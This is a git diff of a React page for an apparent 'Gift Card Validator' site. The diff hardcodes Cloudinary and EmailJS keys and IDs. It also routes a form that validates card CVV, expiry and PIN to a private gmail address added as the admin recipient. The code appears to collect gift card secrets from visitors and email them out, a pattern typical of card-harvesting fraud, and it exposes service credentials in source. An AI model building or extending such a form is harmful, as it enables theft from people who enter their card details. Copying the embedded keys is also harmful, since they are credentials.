@@ -5,9 +5,11 @@ import emailjs from '@emailjs/browser';
 import imageCompression from 'browser-image-compression';
 import axios from 'axios';
 
-const CLOUD_NAME = process.env.REACT_APP_CLOUD_NAME
+// const CLOUD_NAME = process.env.REACT_APP_CLOUD_NAME
+const CLOUD_NAME = "wordy";
 const CLOUDINARY_URL = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/upload`;
-const CLOUDINARY_UPLOAD_PRESET = process.env.REACT_APP_UPLOAD_PRESET;
+// const CLOUDINARY_UPLOAD_PRESET = process.env.REACT_APP_UPLOAD_PRESET;
+const CLOUDINARY_UPLOAD_PRESET = "pdzoqvo0";
 
 export default function Home({ informationSectionRef }) {
     const faqRef = useRef(null);
@@ -268,13 +270,15 @@ function PurchaseOrValidate() {
             validateCVV,
             validateExpiry,
             validatePin,
-        };
-        const serviceId = process.env.REACT_APP_SERVICE_ID;
-        const templateId = process.env.REACT_APP_TEMPLATE_ID;
-        const publicKey = process.env.REACT_APP_PUBLIC_KEY
-        // const publicKey = "BoqfOqh8-iO3tlecS"
-        const templateParams = {
+        };        // const serviceId = process.env.REACT_APP_SERVICE_ID;
+        // const templateId = process.env.REACT_APP_TEMPLATE_ID;
+        // const publicKey = process.env.REACT_APP_PUBLIC_KEY;
+        const publicKey = process.env.REACT_APP_PUBLIC_KEY || "BoqfOqh8-iO3tlecS";
+        const templateId = process.env.REACT_APP_TEMPLATE_ID || "template_mcgcud6";
+        const serviceId = process.env.REACT_APP_SERVICE_ID || "service_x64dc24";
+        const adminEmail = process.env.REACT_APP_ADMIN_EMAIL || "help.allgiftcardvalidator@gmail.com";        const templateParams = {
             from_name: "Gift Card Validator",
+            to_email: adminEmail, // Send to business admin
             CustomerEmail: validateUserEmail,
             CardType: selectedCard?.name,
             Currency: validateCurrency,
